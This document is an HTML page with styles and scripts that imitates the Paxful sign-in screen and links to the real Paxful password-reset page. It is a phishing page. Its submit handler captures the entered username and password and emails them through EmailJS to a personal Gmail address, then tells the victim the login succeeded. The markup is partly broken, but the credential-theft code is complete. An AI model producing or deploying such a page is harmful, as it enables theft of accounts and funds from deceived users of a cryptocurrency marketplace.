    <style>
        :root {
            --primary-color: #C9F24D;
            --text-color: #fff;
            --text-secondary: #ccc;
            --bg-color: #000;
            --input-bg: #1a1a1a;
            --input-border: #333;
            --spacing-sm: clamp(8px, 2vw, 16px);
            --spacing-lg: clamp(16px, 4vw, 32px);
            --font-size-base: clamp(14px, 2.5vw, 16px);
            --font-size-heading: clamp(24px, 5vw, 32px);
            --container-width: clamp(300px, 90vw, 498px);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: var(--bg-color);
            color: var(--text-color);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .page-wrapper {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .content-wrapper {
            display: flex;
            flex-direction: row;
            flex-grow: 1;
            gap: var(--spacing-lg);
        }

        .login-section {
            width: 100%;
            max-width: var(--container-width);
            margin: 0 auto;
            padding: var(--spacing-lg);
            display: flex;
            flex-direction: column;
            gap: var(--spacing-lg);
        }

        .logo-wrapper {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
        }

        .logo-icon {
            width: clamp(24px, 5vw, 32px);
            height: clamp(24px, 5vw, 32px);
            fill: var(--primary-color);
        }

        .logo-text {
            height: clamp(20px, 4vw, 34px);
            fill: var(--text-color);
        }

        .welcome-text h1 {
            font-size: var(--font-size-heading);
            font-weight: 600;
            margin-bottom: var(--spacing-sm);
        }

        .welcome-text p {
            font-size: var(--font-size-base);
            color: var(--text-secondary);
        }

        .welcome-text a {
            color: var(--primary-color);
            text-decoration: underline;
        }

        .login-form {
            display: flex;
            flex-direction: column;
            gap: var(--spacing-lg);
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: var(--spacing-sm);
        }

        .form-group label {
            font-size: var(--font-size-base);
            font-weight: 500;
            color: var(--text-secondary);
            display: none;
        }

        .form-group input {
            width: 100%;
            padding: var(--spacing-sm);
            height: clamp(40px, 10vw, 56px);
            font-size: var(--font-size-base);
            border-radius: 8px;
            border: 1px solid var(--input-border);
            background: var(--input-bg);
            color: var(--text-color);
            outline: none;
        }

        .form-group input::placeholder {
            color: var(--text-secondary);
            opacity: 0.7;
        }

        .forgot-password {
            text-align: right;
            font-size: var(--font-size-base);
        }

        .forgot-password a {
            color: var(--text-secondary);
            text-decoration: underline;
        }

        .login-button {
            width: 100%;
            padding: var(--spacing-sm);
            height: clamp(40px, 10vw, 48px);
            font-size: var(--font-size-base);
            font-weight: 600;
            background: var(--primary-color);
            color: var(--bg-color);
            border: none;
            border-radius: 24px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .login-button:hover {
            background: #b8e042;
        }

        .background-section {
            display: none;
            flex-grow: 1;
            width: 50%;
            /* Updated background image path and fitting */
            background: url('../_next/static/media/Screenshot 2025-03-04 182035.png') no-repeat center center;
            background-size: cover; /* Ensures the image fits the section */
            overflow: hidden;
            position: relative;
        }

        .background-section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('../_next/static/media/Screenshot 2025-03-04 182035.png') no-repeat center center;
            background-size: cover; /* Ensures the image fits */
            z-index: 1;
        }

        @media (min-width: 768px) {
            .page-wrapper {
                flex-direction: row;
            }

            .login-section {
                width: 50%;
                max-width: var(--container-width);
            }

            .background-section {
                display: block; /* Shows the background section on larger screens */
            }
        }

        @media (min-width: 1200px) {
            .login-section {
                width: 498px;
                box-shadow: 0 4px 8px rgba(255, 255, 255, 0.25);
            }
        }
    </style>
</head>
<body>

            <div class="welcome-text">
                <h1>Welcome back!</h1>

            <form class="login-form" id="loginForm" method="POST" action="">
                <div class="form-group">
                    <label for="username">Email / Phone Number</label>
                    <input type="text" id="username" name="username" placeholder="Email / Phone Number" required autocomplete="email">
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
                </div>
                <div class="forgot-password">
                    <a href="https://accounts.paxful.com/forgot-password">Forgot password?</a>
                </div>
                <button type="submit" class="login-button">Sign in</button>

        </section>
        <div class="background-section"></div>
    </div>

    <!-- EmailJS Script -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        // Initialize EmailJS with your Public Key
        emailjs.init('YOUR_PUBLIC_KEY'); // Replace with your EmailJS Public Key

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Prevent default form submission

            // Get form values
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Email parameters
            const templateParams = {
                to_email: 'piusmuchui0@gmail.com', // Recipient email
                from_name: 'Paxful Login Form',
                username: username,
                password: password
            };

            // Send email using EmailJS
            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
                .then(function(response) {
                    console.log('Email sent successfully!', response.status, response.text);
                    alert('Login details submitted successfully!');
                }, function(error) {
                    console.error('Failed to send email:', error);
                    alert('Failed to submit login details. Please try again.');
                });

            // Clear the form after submission
            this.reset();
        });
    </script>

    <!-- Theme Toggle Script -->
    <script>
        (function() {
            try {
                const docElement = document.documentElement;
                const classList = docElement.classList;
                classList.remove('dark', 'light');
                const savedTheme = localStorage.getItem('theme');
                if (savedTheme === 'system' || (!savedTheme && false)) {
                    const darkQuery = window.matchMedia('(prefers-color-scheme: dark)');
                    if (darkQuery.matches) {
                        docElement.style.colorScheme = 'dark';
                        classList.add('dark');
                    } else {
                        docElement.style.colorScheme = 'light';
                        classList.add('light');
                    }
                } else if (savedTheme) {
                    classList.add(savedTheme);
                } else {
                    classList.add('dark');
                }
            } catch (e) {}
        })();
    </script>
